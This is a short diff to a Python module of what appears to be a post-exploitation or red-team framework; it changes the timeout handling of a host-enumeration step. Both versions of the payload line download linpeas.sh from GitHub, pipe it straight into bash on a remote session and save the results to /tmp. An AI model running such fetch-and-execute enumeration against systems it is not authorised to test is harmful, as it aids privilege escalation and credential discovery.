@@ -97,7 +97,7 @@ class Module(BaseModule):
             def enumerate():
                 # run host enumeration
                 try:
-                    payload = 'timeout 120 curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files | tee /tmp/linpeas.txt'
+                    payload = 'timeout --signal=9 120 /bin/bash -c "curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files | tee /tmp/linpeas.txt" || true'
                     session.log("payload loaded and ready")
                     result = run_base64_payload(
                         session=session, payload=payload, log_name="payload_linpeas", timeout=180)
